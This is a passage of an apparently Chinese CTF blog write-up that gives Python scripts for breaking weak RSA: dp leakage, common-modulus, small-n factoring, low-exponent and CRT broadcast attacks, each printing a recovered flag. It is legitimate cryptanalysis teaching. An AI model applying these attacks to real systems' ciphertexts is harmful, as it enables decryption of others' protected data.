class="number">1</span>) * (p - <span class="number">1</span>)  <span class="comment"># 欧拉定理</span></span><br><span class="line">            d = gp.invert(e, phi)  <span class="comment"># 求模逆</span></span><br><span class="line">            m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># 快速求幂取模运算</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)  <span class="comment"># 10进制明文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])  <span class="comment"># 16进制明文</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))  <span class="comment"># 16进制转文本  flag&#123;wow_leaking_dp_breaks_rsa?_98924743502&#125;</span></span><br></pre></td></tr></table></figure><h4 id="c1c2ne1e2，求-m（共模攻击）"><a href="#c1c2ne1e2，求-m（共模攻击）" class="headerlink" title="c1c2ne1e2，求 m（共模攻击）"></a>c1c2ne1e2，求 m（共模攻击）</h4><p>使用相同的模数 n 来加密相同的明文 m，使用的指数 e 不同且互质，得到密文 c1 和 c2，可直接解密出密文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">c1 = <span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">e1 = <span class="number">11187289</span></span><br><span class="line">c2 = <span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2 = <span class="number">9647291</span></span><br><span class="line">r, s1, s2 = gmpy2.gcdext(e1, e2)</span><br><span class="line">m = (<span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n)) % n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))  <span class="comment"># flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ecn，求-m（n-分解出多个不同的因子）"><a href="#ecn，求-m（n-分解出多个不同的因子）" class="headerlink" title="ecn，求 m（n 分解出多个不同的因子）"></a>ecn，求 m（n 分解出多个不同的因子）</h4><p><img src="/assets/CTF/Crypto/3.png" alt="Crypto3"></p><p>n 比较小，可以进行<a href="http://www.factordb.com/index.php">质因数分解</a>。三个质因数分解为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">P17 = 67724172605733871</span><br><span class="line">P20 = 11571390939636959887</span><br><span class="line">P24 = 694415063702720454699679</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">544187306850902797629107353619267427694837163600853983242783</span></span><br><span class="line">e = <span class="number">39293</span></span><br><span class="line">c = <span class="number">439254895818320413408827022398053685867343267971712332011972</span></span><br><span class="line">p1 = <span class="number">67724172605733871</span></span><br><span class="line">p2 = <span class="number">11571390939636959887</span></span><br><span class="line">p3 = <span class="number">694415063702720454699679</span></span><br><span class="line">phi = (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (p3 - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m)) <span class="comment"># flag&#123;a4ffbd7eac428b0fe0&#125;</span></span><br></pre></td></tr></table></figure><h4 id="ecn，求-m（e-很短）（低加密指数攻击）"><a href="#ecn，求-m（e-很短）（低加密指数攻击）" class="headerlink" title="ecn，求 m（e 很短）（低加密指数攻击）"></a>ecn，求 m（e 很短）（低加密指数攻击）</h4><p>m 很短，e 非常小，可用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">di</span>(<span class="params">c, e, n</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        me = c + n * k</span><br><span class="line">        flag, result = gmpy2.iroot(me, e)</span><br><span class="line">        <span class="keyword">if</span> result == <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;52d483c27cd806550fbe0e37a61af2e7cf5e0efb723dfc81174c918a27627779b21fa3c851e9e94188eaee3d5cd6f752406a43fbecb53e80836ff1e185d3ccd7782ea846c2e91a7b0808986666e0bdadbfb7bdd65670a589a4d2478e9adcafe97c6ee23614bcb2ecc23580f4d2e3cc1ecfec25c50da4bc754dde6c8bfd8d1fc16956c74d8e9196046a01dc9f3024e11461c294f29d7421140732fedacac97b8fe50999117d27943c953f18c4ff4f8c258d839764078d4b6ef6e8591e0ff5563b31a39e6374d0d41c8c46921c25e5904a817ef8e39e5c9b71225a83269693e0b7e3218fc5e5a1e8412ba16e588b3d6ac536dce39fcdfce81eec79979ea6872793&quot;</span>,</span><br><span class="line">    <span class="number">16</span>,</span><br><span class="line">)</span><br><span class="line">e = <span class="built_in">int</span>(<span class="string">&quot;3&quot;</span>, <span class="number">16</span>)</span><br><span class="line">c = <span class="built_in">int</span>(</span><br><span class="line">    <span class="string">&quot;10652cdfaa6b63f6d7bd1109da08181e500e5643f5b240a9024bfa84d5f2cac9310562978347bb232d63e7289283871efab83d84ff5a7b64a94a79d34cfbd4ef121723ba1f663e514f83f6f01492b4e13e1bb4296d96ea5a353d3bf2edd2f449c03c4a3e995237985a596908adc741f32365&quot;</span>,</span><br><span class="line">    <span class="number">16</span>,</span><br><span class="line">)</span><br><span class="line">m = di(c, e, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m)) <span class="comment"># flag&#123;25df8caf006ee5db94d48144c33b2c3b&#125;</span></span><br></pre></td></tr></table></figure><h4 id="c1c2c3n1n2n3，求-m（低加密指数广播攻击）"><a href="#c1c2c3n1n2n3，求-m（低加密指数广播攻击）" class="headerlink" title="c1c2c3n1n2n3，求 m（低加密指数广播攻击）"></a>c1c2c3n1n2n3，求 m（低加密指数广播攻击）</h4><p>根据<a href="https://oi-wiki.org/math/number-theory/crt/">中国剩余定理</a>，解出答案</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CRT</span>(<span class="params">c, n</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="comment"># ni 的乘积,N=n1*n2*n3</span></span><br><span class="line">    N = reduce(<span class="keyword">lambda</span> x, y: x * y, n)</span><br><span class="line">    <span class="comment"># zip()将对象打包成元组</span></span><br><span class="line">    <span class="keyword">for</span> n_i, c_i <span class="keyword">in</span> <span class="built_in">zip</span>(n, c):</span><br><span class="line">        N_i = N // n_i</span><br><span class="line">        t_i = gmpy2.invert(N_i, n_i)</span><br><span class="line">        <span class="built_in">sum</span> += c_i * N_i * t_i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sum</span> % N</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004</span></span><br><span class="line">c1 = <span class="number">310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243</span></span><br><span class="line">n2 = <span class="number">302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114</span></span><br><span class="line">c2 = <span class="number">112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344</span></span><br><span class="line">n3 = <span class="number">332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323</span></span><br><span class="line">c3 = <span class="number">10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="built_in">int</span>(<span class="built_in">str</span>(n1), <span class="number">5</span>)</span><br><span class="line">c1 = <span class="built_in">int</span>(<span class="built_in">str</span>(c1), <span class="number">5</span>)</span><br><span class="line">n2 = <span class="built_in">int</span>(<span class="built_in">str</span>(n2), <span class="number">5</span>)</span><br><span class="line">c2 = <span class="built_in">int</span>(<span class="built_in">str</span>(c2), <span class="number">5</span>)</span><br><span class="line">n3 = <span class="built_in">int</span>(<span class="built_in">str</span>(n3), <span class="number">5</span>)</span><br><span class="line">c3 = <span class="built_in">int</span>(<span class="built_in">str</span>(c3), <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">n = [n1, n2, n3]</span><br><span class="line">c = [c1, c2, c3]</span><br><span class="line"></span><br><span class="line">x = CRT(c, n)</span><br><span class="line"><span class="comment"># e一般都不大可以尝试爆破</span></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    m, r = gmpy2.iroot(x, e)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(m)) <span class="comment"># noxCTF&#123;D4mn_y0u_h4s74d_wh47_4_b100dy_b4s74rd!&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">20474918894051778533305262345601880928088284471121823754049725354072477155873778848055073843345820697886641086842612486541250183965966001591342031562953561793332341641334302847996108417466360688139866505179689516589305636902137210185624650854906780037204412206309949199080005576922775773722438863762117750429327585792093447423980002401200613302943834212820909269713876683465817369158585822294675056978970612202885426436071950214538262921077409076160417436699836138801162621314845608796870206834704116707763169847387223307828908570944984416973019427529790029089766264949078038669523465243837675263858062854739083634207</span></span><br><span class="line">c0 = <span class="number">974463908243330865728978769213595400782053398596897741316275722596415018912929508637393850919224969271766388710025195039896961956062895570062146947736340342927974992616678893372744261954172873490878805483241196345881721164078651156067119957816422768524442025688079462656755605982104174001635345874022133045402344010045961111720151990412034477755851802769069309069018738541854130183692204758761427121279982002993939745343695671900015296790637464880337375511536424796890996526681200633086841036320395847725935744757993013352804650575068136129295591306569213300156333650910795946800820067494143364885842896291126137320</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">20918819960648891349438263046954902210959146407860980742165930253781318759285692492511475263234242002509419079545644051755251311392635763412553499744506421566074721268822337321637265942226790343839856182100575539845358877493718334237585821263388181126545189723429262149630651289446553402190531135520836104217160268349688525168375213462570213612845898989694324269410202496871688649978370284661017399056903931840656757330859626183773396574056413017367606446540199973155630466239453637232936904063706551160650295031273385619470740593510267285957905801566362502262757750629162937373721291789527659531499435235261620309759</span></span><br><span class="line">c1 = <span class="number">15819636201971185538694880505120469332582151856714070824521803121848292387556864177196229718923770810072104155432038682511434979353089791861087415144087855679134383396897817458726543883093567600325204596156649305930352575274039425470836355002691145864435755333821133969266951545158052745938252574301327696822347115053614052423028835532509220641378760800693351542633860702225772638930501021571415907348128269681224178300248272689705308911282208685459668200507057183420662959113956077584781737983254788703048275698921427029884282557468334399677849962342196140864403989162117738206246183665814938783122909930082802031855</span></span><br><span class="line"></span><br><span class="line">n2 = <span class="number">25033254625906757272369609119214202033162128625171246436639570615263949157363273213121556825878737923265290579551873824374870957467163989542063489416636713654642486717219231225074115269684119428086352535471683359486248203644461465935500517901513233739152882943010177276545128308412934555830087776128355125932914846459470221102007666912211992310538890654396487111705385730502843589727289829692152177134753098649781412247065660637826282055169991824099110916576856188876975621376606634258927784025787142263367152947108720757222446686415627479703666031871635656314282727051189190889008763055811680040315277078928068816491</span></span><br><span class="line">c2 = <span class="number">4185308529416874005831230781014092407198451385955677399668501833902623478395669279404883990725184332709152443372583701076198786635291739356770857286702107156730020004358955622511061410661058982622055199736820808203841446796305284394651714430918690389486920560834672316158146453183789412140939029029324756035358081754426645160033262924330248675216108270980157049705488620263485129480952814764002865280019185127662449318324279383277766416258142275143923532168798413011028271543085249029048997452212503111742302302065401051458066585395360468447460658672952851643547193822775218387853623453638025492389122204507555908862</span></span><br><span class="line"></span><br><span class="line">n3 = <span class="number">21206968097314131007183427944486801953583151151443627943113736996776787181111063957960698092696800555044199156765677935373149598221184792286812213294617749834607696302116136745662816658117055427803315230042700695125718401646810484873064775005221089174056824724922160855810527236751389605017579545235876864998419873065217294820244730785120525126565815560229001887622837549118168081685183371092395128598125004730268910276024806808565802081366898904032509920453785997056150497645234925528883879419642189109649009132381586673390027614766605038951015853086721168018787523459264932165046816881682774229243688581614306480751</span></span><br><span class="line">c3 = <span class="number">4521038011044758441891128468467233088493885750850588985708519911154778090597136126150289041893454126674468141393472662337350361712212694867311622970440707727941113263832357173141775855227973742571088974593476302084111770625764222838366277559560887042948859892138551472680654517814916609279748365580610712259856677740518477086531592233107175470068291903607505799432931989663707477017904611426213770238397005743730386080031955694158466558475599751940245039167629126576784024482348452868313417471542956778285567779435940267140679906686531862467627238401003459101637191297209422470388121802536569761414457618258343550613</span></span><br><span class="line"></span><br><span class="line">n4 = <span class="number">22822039733049388110936778173014765663663303811791283234361230649775805923902173438553927805407463106104699773994158375704033093471761387799852168337898526980521753614307899669015931387819927421875316304591521901592823814417756447695701045846773508629371397013053684553042185725059996791532391626429712416994990889693732805181947970071429309599614973772736556299404246424791660679253884940021728846906344198854779191951739719342908761330661910477119933428550774242910420952496929605686154799487839923424336353747442153571678064520763149793294360787821751703543288696726923909670396821551053048035619499706391118145067</span></span><br><span class="line">c4 = <span class="number">15406498580761780108625891878008526815145372096234083936681442225155097299264808624358826686906535594853622687379268969468433072388149786607395396424104318820879443743112358706546753935215756078345959375299650718555759698887852318017597503074317356745122514481807843745626429797861463012940172797612589031686718185390345389295851075279278516147076602270178540690147808314172798987497259330037810328523464851895621851859027823681655934104713689539848047163088666896473665500158179046196538210778897730209572708430067658411755959866033531700460551556380993982706171848970460224304996455600503982223448904878212849412357</span></span><br><span class="line"></span><br><span class="line">n5 = <span class="number">21574139855341432908474064784318462018475296809327285532337706940126942575349507668289214078026102682252713757703081553093108823214063791518482289846780197329821139507974763780260290309600884920811959842925540583967085670848765317877441480914852329276375776405689784571404635852204097622600656222714808541872252335877037561388406257181715278766652824786376262249274960467193961956690974853679795249158751078422296580367506219719738762159965958877806187461070689071290948181949561254144310776943334859775121650186245846031720507944987838489723127897223416802436021278671237227993686791944711422345000479751187704426369</span></span><br><span class="line">c5 = <span class="number">20366856150710305124583065375297661819795242238376485264951185336996083744604593418983336285185491197426018595031444652123288461491879021096028203694136683203441692987069563513026001861435722117985559909692670907347563594578265880806540396777223906955491026286843168637367593400342814725694366078337030937104035993569672959361347287894143027186846856772983058328919716702982222142848848117768499996617588305301483085428547267337070998767412540225911508196842253134355901263861121500650240296746702967594224401650220168780537141654489215019142122284308116284129004257364769474080721001708734051264841350424152506027932</span></span><br><span class="line"></span><br><span class="line">n6 = <span class="number">25360227412666612490102161131174584819240931803196448481224305250583841439581008528535930814167338381983764991296575637231916547647970573758269411168219302370541684789125112505021148506809643081950237623703181025696585998044695691322012183660424636496897073045557400768745943787342548267386564625462143150176113656264450210023925571945961405709276631990731602198104287528528055650050486159837612279600415259486306154947514005408907590083747758953115486124865486720633820559135063440942528031402951958557630833503775112010715604278114325528993771081233535247118481765852273252404963430792898948219539473312462979849137</span></span><br><span class="line">c6 = <span class="number">19892772524651452341027595619482734356243435671592398172680379981502759695784087900669089919987705675899945658648623800090272599154590123082189645021800958076861518397325439521139995652026377132368232502108620033400051346127757698623886142621793423225749240286511666556091787851683978017506983310073524398287279737680091787333547538239920607761080988243639547570818363788673249582783015475682109984715293163137324439862838574460108793714172603672477766831356411304446881998674779501188163600664488032943639694828698984739492200699684462748922883550002652913518229322945040819064133350314536378694523704793396169065179</span></span><br><span class="line"></span><br><span class="line">n7 = <span class="number">22726855244632356029159691753451822163331519237547639938779517751496498713174588935566576167329576494790219360727877166074136496129927296296996970048082870488804456564986667129388136556137013346228118981936899510687589585286517151323048293150257036847475424044378109168179412287889340596394755257704938006162677656581509375471102546261355748251869048003600520034656264521931808651038524134185732929570384705918563982065684145766427962502261522481994191989820110575981906998431553107525542001187655703534683231777988419268338249547641335718393312295800044734534761692799403469497954062897856299031257454735945867491191</span></span><br><span class="line">c7 = <span class="number">6040119795175856407541082360023532204614723858688636724822712717572759793960246341800308149739809871234313049629732934797569781053000686185666374833978403290525072598774001731350244744590772795701065129561898116576499984185920661271123665356132719193665474235596884239108030605882777868856122378222681140570519180321286976947154042272622411303981011302586225630859892731724640574658125478287115198406253847367979883768000812605395482952698689604477719478947595442185921480652637868335673233200662100621025061500895729605305665864693122952557361871523165300206070325660353095592778037767395360329231331322823610060006</span></span><br><span class="line"></span><br><span class="line">n8 = <span class="number">23297333791443053297363000786835336095252290818461950054542658327484507406594632785712767459958917943095522594228205423428207345128899745800927319147257669773812669542782839237744305180098276578841929496345963997512244219376701787616046235397139381894837435562662591060768476997333538748065294033141610502252325292801816812268934171361934399951548627267791401089703937389012586581080223313060159456238857080740699528666411303029934807011214953984169785844714159627792016926490955282697877141614638806397689306795328344778478692084754216753425842557818899467945102646776342655167655384224860504086083147841252232760941</span></span><br><span class="line">c8 = <span class="number">5418120301208378713115889465579964257871814114515046096090960159737859076829258516920361577853903925954198406843757303687557848302302200229295916902430205737843601806700738234756698575708612424928480440868739120075888681672062206529156566421276611107802917418993625029690627196813830326369874249777619239603300605876865967515719079797115910578653562787899019310139945904958024882417833736304894765433489476234575356755275147256577387022873348906900149634940747104513850154118106991137072643308620284663108283052245750945228995387803432128842152251549292698947407663643895853432650029352092018372834457054271102816934</span></span><br><span class="line"></span><br><span class="line">n9 = <span class="number">28873667904715682722987234293493200306976947898711255064125115933666968678742598858722431426218914462903521596341771131695619382266194233561677824357379805303885993804266436810606263022097900266975250431575654686915049693091467864820512767070713267708993899899011156106766178906700336111712803362113039613548672937053397875663144794018087017731949087794894903737682383916173267421403408140967713071026001874733487295007501068871044649170615709891451856792232315526696220161842742664778581287321318748202431466508948902745314372299799561625186955234673012098210919745879882268512656931714326782335211089576897310591491</span></span><br><span class="line">c9 = <span class="number">9919880463786836684987957979091527477471444996392375244075527841865509160181666543016317634963512437510324198702416322841377489417029572388474450075801462996825244657530286107428186354172836716502817609070590929769261932324275353289939302536440310628698349244872064005700644520223727670950787924296004296883032978941200883362653993351638545860207179022472492671256630427228461852668118035317021428675954874947015197745916918197725121122236369382741533983023462255913924692806249387449016629865823316402366017657844166919846683497851842388058283856219900535567427103603869955066193425501385255322097901531402103883869</span></span><br><span class="line"></span><br><span class="line">n10 = <span class="number">22324685947539653722499932469409607533065419157347813961958075689047690465266404384199483683908594787312445528159635527833904475801890381455653807265501217328757871352731293000303438205315816792663917579066674842307743845261771032363928568844669895768092515658328756229245837025261744260614860746997931503548788509983868038349720225305730985576293675269073709022350700836510054067641753713212999954307022524495885583361707378513742162566339010134354907863733205921845038918224463903789841881400814074587261720283879760122070901466517118265422863420376921536734845502100251460872499122236686832189549698020737176683019</span></span><br><span class="line">c10 = <span class="number">1491527050203294989882829248560395184804977277747126143103957219164624187528441047837351263580440686474767380464005540264627910126483129930668344095814547592115061057843470131498075060420395111008619027199037019925701236660166563068245683975787762804359520164701691690916482591026138582705558246869496162759780878437137960823000043988227303003876410503121370163303711603359430764539337597866862508451528158285103251810058741879687875218384160282506172706613359477657215420734816049393339593755489218588796607060261897905233453268671411610631047340459487937479511933450369462213795738933019001471803157607791738538467</span></span><br><span class="line"></span><br><span class="line">n11 = <span class="number">27646746423759020111007828653264027999257847645666129907789026054594393648800236117046769112762641778865620892443423100189619327585811384883515424918752749559627553637785037359639801125213256163008431942593727931931898199727552768626775618479833029101249692573716030706695702510982283555740851047022672485743432464647772882314215176114732257497240284164016914018689044557218920300262234652840632406067273375269301008409860193180822366735877288205783314326102263756503786736122321348320031950012144905869556204017430593656052867939493633163499580242224763404338807022510136217187779084917996171602737036564991036724299</span></span><br><span class="line">c11 = <span class="number">21991524128957260536043771284854920393105808126700128222125856775506885721971193109361315961129190814674647136464887087893990660894961612838205086401018885457667488911898654270235561980111174603323721280911197488286585269356849579263043456316319476495888696219344219866516861187654180509247881251251278919346267129904739277386289240394384575124331135655943513831009934023397457082184699737734388823763306805326430395849935770213817533387235486307008892410920611669932693018165569417445885810825749609388627231235840912644654685819620931663346297596334834498661789016450371769203650109994771872404185770230172934013971</span></span><br><span class="line"></span><br><span class="line">n12 = <span class="number">20545487405816928731738988374475012686827933709789784391855706835136270270933401203019329136937650878386117187776530639342572123237188053978622697282521473917978282830432161153221216194169879669541998840691383025487220850872075436064308499924958517979727954402965612196081404341651517326364041519250125036424822634354268773895465698920883439222996581226358595873993976604699830613932320720554130011671297944433515047180565484495191003887599891289037982010216357831078328159028953222056918189365840711588671093333013117454034313622855082795813122338562446223041211192277089225078324682108033843023903550172891959673551</span></span><br><span class="line">c12 = <span class="number">14227439188191029461250476692790539654619199888487319429114414557975376308688908028140817157205579804059783807641305577385724758530138514972962209062230576107406142402603484375626077345190883094097636019771377866339531511965136650567412363889183159616188449263752475328663245311059988337996047359263288837436305588848044572937759424466586870280512424336807064729894515840552404756879590698797046333336445465120445087587621743906624279621779634772378802959109714400516183718323267273824736540168545946444437586299214110424738159957388350785999348535171553569373088251552712391288365295267665691357719616011613628772175</span></span><br><span class="line"></span><br><span class="line">n13 = <span class="number">27359727711584277234897157724055852794019216845229798938655814269460046384353568138598567755392559653460949444557879120040796798142218939251844762461270251672399546774067275348291003962551964648742053215424620256999345448398805278592777049668281558312871773979931343097806878701114056030041506690476954254006592555275342579529625231194321357904668512121539514880704046969974898412095675082585315458267591016734924646294357666924293908418345508902112711075232047998775303603175363964055048589769318562104883659754974955561725694779754279606726358588862479198815999276839234952142017210593887371950645418417355912567987</span></span><br><span class="line">c13 = <span class="number">3788529784248255027081674540877016372807848222776887920453488878247137930578296797437647922494510483767651150492933356093288965943741570268943861987024276610712717409139946409513963043114463933146088430004237747163422802959250296602570649363016151581364006795894226599584708072582696996740518887606785460775851029814280359385763091078902301957226484620428513604630585131511167015763190591225884202772840456563643159507805711004113901417503751181050823638207803533111429510911616160851391754754434764819568054850823810901159821297849790005646102129354035735350124476838786661542089045509656910348676742844957008857457</span></span><br><span class="line"></span><br><span class="line">n14 = <span 